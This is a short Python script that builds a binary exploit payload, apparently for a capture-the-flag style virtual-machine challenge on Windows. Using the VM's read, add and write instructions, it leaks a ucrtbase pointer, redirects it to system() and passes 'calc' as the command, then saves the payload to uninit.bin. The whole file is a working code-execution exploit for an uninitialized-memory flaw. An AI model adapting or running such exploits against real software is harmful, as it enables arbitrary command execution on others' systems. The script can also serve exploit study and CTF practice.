from environment import *
from util import *

OFFSET_MEMORY_TO_UCRTBASE_SHOULD_COPY_ANOTHER_CHARACTER_0xe = 0x94


def ins_bye() -> bytes:
    return b"\x00"


def ins_read(reg: int, value: int) -> bytes:
    return b"\x31" + le32(reg) + le32(value)


def ins_write(reg: int, value: int) -> bytes:
    return b"\x32" + le32(reg) + le32(value)


def ins_add(reg: int, value: int) -> bytes:
    return b"\x33" + le32(reg) + le32(u32(value))


def generate_payload() -> bytes:
    payload = b""
    payload += ins_read(0, OFFSET_MEMORY_TO_UCRTBASE_SHOULD_COPY_ANOTHER_CHARACTER_0xe)
    payload += ins_add(
        0, -0xE - X86_OFFSET_should_copy_another_character + X86_OFFSET_system
    )
    payload += ins_write(0, 9 * 3 + 1)
    payload += ins_read(3, 9 * 4)
    payload += b"calc\00"
    return payload


def main():
    payload = generate_payload()

    with open("uninit.bin", "wb") as f:
        f.write(payload)


if __name__ == "__main__":
    main()
